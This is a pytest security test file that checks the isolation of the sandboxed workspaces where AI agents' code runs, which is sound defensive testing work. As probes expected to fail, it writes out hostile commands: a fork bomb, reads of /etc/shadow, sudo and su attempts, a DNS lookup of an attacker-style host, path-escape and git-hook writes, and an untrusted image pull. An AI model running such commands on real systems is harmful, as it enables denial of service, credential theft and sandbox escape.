# SPDX-License-Identifier: AGPL-3.0-or-later
"""T1, T13, T14, T19, T20: what the agents' code can reach from a real workspace."""

import time
import uuid

import pytest
from docker.errors import ImageNotFound

from dexterhouse_runner.workspace_mcp.base import parse_size
from dexterhouse_schema.runner import WorkspaceCreate
from tests.live_runner import STACK, create_workspace, destroy_workspace, output, run, tool

pytestmark = pytest.mark.security


@pytest.fixture(scope="module")
def workspace(live_runner):
    workspace_id = create_workspace(live_runner)
    yield workspace_id
    destroy_workspace(live_runner, workspace_id)


def test_st01_no_docker_socket(live_runner, workspace):
    socket = run(live_runner, workspace, "ls -la /var/run/docker.sock")
    assert socket.data["exit_code"] != 0
    assert "No such file" in output(socket)
    assert run(live_runner, workspace, "which docker").data["exit_code"] != 0
    cgroup = run(live_runner, workspace, "cat /proc/1/cgroup; ls /sys/fs/cgroup")
    assert "docker.sock" not in output(cgroup)


def test_st02_no_route_to_services_or_the_internet(live_runner, workspace):
    before = live_runner.heartbeat().metrics["egress_denied_total"]
    for target in ("http://postgres:5432", "http://redis:6379", "http://web:8000"):
        result = run(live_runner, workspace, f"curl -sS -m3 --noproxy '*' {target}")
        assert result.data["exit_code"] != 0, target
    direct = run(live_runner, workspace, "curl -sS -m3 --noproxy '*' https://pypi.org/simple/")
    assert direct.data["exit_code"] != 0  # no route out but the proxy
    denied = run(
        live_runner, workspace, "curl -sS -m5 -o /dev/null -w '%{http_connect}' https://example.com"
    )
    assert denied.data["exit_code"] != 0
    assert "403" in denied.data["stdout"]
    for _ in range(10):  # the proxy's log reaches `docker logs` through a tail
        if live_runner.heartbeat().metrics["egress_denied_total"] > before:
            break
        time.sleep(0.5)
    assert live_runner.heartbeat().metrics["egress_denied_total"] > before


def test_st02_allowlisted_host_goes_through_the_proxy(live_runner, workspace):
    result = run(
        live_runner,
        workspace,
        "curl -sS -m20 -o /dev/null -w '%{http_code}' https://pypi.org/simple/",
    )
    assert result.data["stdout"] == "200", output(result)


def test_st03_no_privileges(live_runner, workspace):
    result = run(
        live_runner,
        workspace,
        "id -u; grep CapEff /proc/self/status; grep NoNewPrivs /proc/self/status",
    )
    lines = result.data["stdout"].split()
    assert lines[0] == "1000"
    assert "0000000000000000" in lines
    assert lines[-1] == "1"
    for command in (
        "sudo -n true",
        "cat /etc/shadow",
        "mount -t tmpfs none /mnt",
        "su -c id root </dev/null",
    ):
        assert run(live_runner, workspace, command).data["exit_code"] != 0, command
    setuid = run(live_runner, workspace, "find / -xdev -perm /6000 -type f 2>/dev/null")
    assert setuid.data["stdout"].strip() == ""


def test_writes_outside_the_volume_fail(live_runner, workspace):
    for path in ("/etc/evil", "/usr/local/bin/evil", "/opt/dexterhouse/evil", "/root/evil"):
        assert run(live_runner, workspace, f"touch {path}").data["exit_code"] != 0, path
    assert run(live_runner, workspace, "touch /workspace/ok /tmp/ok").data["exit_code"] == 0
    escape = tool(live_runner, workspace, "workspace_write", path="../etc/x", content="x")
    assert escape.error.code == "workspace_escape"
    git = tool(
        live_runner, workspace, "workspace_write", path=".git/hooks/pre-commit", content="exit 0"
    )
    assert git.error.code == "workspace_escape"


def test_st19_no_external_dns(live_runner, workspace):
    lookup = run(
        live_runner, workspace, "getent hosts secret.attacker.example; getent hosts example.com"
    )
    assert lookup.data["exit_code"] != 0
    assert lookup.data["stdout"].strip() == ""
    udp = run(
        live_runner,
        workspace,
        'python3 -c "import socket; s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM); '
        "s.settimeout(2); s.sendto(b'x', ('8.8.8.8', 53)); s.recv(10)\"",
    )
    assert udp.data["exit_code"] != 0


def test_st18_fork_bomb_and_disk_quota(live_runner):
    workspace = create_workspace(live_runner, pids=128, disk="256m")
    try:
        bomb = run(live_runner, workspace, ":(){ :|:& };:", timeout_s=8)
        assert bomb.error is None or bomb.error.code == "timeout"
        assert live_runner.docker.find(workspace).status == "running"
        big = run(
            live_runner, workspace, "fallocate -l 300m big || head -c 300000000 /dev/zero > big"
        )
        assert big.error.code == "quota_exceeded"
        assert parse_size("256m") < 300 * 1024 * 1024
        still = run(live_runner, workspace, "rm -f big; echo alive")
        assert still.data["stdout"].strip() == "alive"
    finally:
        destroy_workspace(live_runner, workspace)


def test_st24_image_outside_the_allowlist(live_runner, docker_client):
    workspace_id = uuid.uuid4()
    result = live_runner.create(
        WorkspaceCreate(
            project_id=uuid.uuid4(),
            workspace_id=workspace_id,
            stack={**STACK, "workspace_image": "docker.io/evil/image:latest"},
        )
    )
    assert result.error.code == "workspace_not_ready"
    kind, message = live_runner.callbacks.sent[-1]
    assert (kind, message.status) == ("workspace_changed", "error")
    with pytest.raises(ImageNotFound):
        docker_client.images.get("docker.io/evil/image:latest")
    assert live_runner.docker.find(workspace_id) is None


def test_st25_sidecars_are_isolated(live_runner):
    stack = {**STACK, "services": ["redis"]}
    first, second = create_workspace(live_runner, stack), create_workspace(live_runner, stack)
    probe = (
        'python3 -c "import socket,sys; socket.create_connection((sys.argv[1], 6379), timeout=3)" '
    )
    try:
        own = run(
            live_runner,
            first,
            "for i in 1 2 3 4 5; do " + probe + "redis && exit 0; sleep 1; done; exit 1",
        )
        assert own.data["exit_code"] == 0, output(own)
        services = tool(live_runner, first, "workspace_services")
        assert services.data["services"][0]["name"] == "redis"
        other = f"{live_runner.docker.name(second)}-redis"
        assert run(live_runner, first, probe + other).data["exit_code"] != 0
        assert run(live_runner, first, f"getent hosts {other}").data["exit_code"] != 0
    finally:
        destroy_workspace(live_runner, first)
        destroy_workspace(live_runner, second)
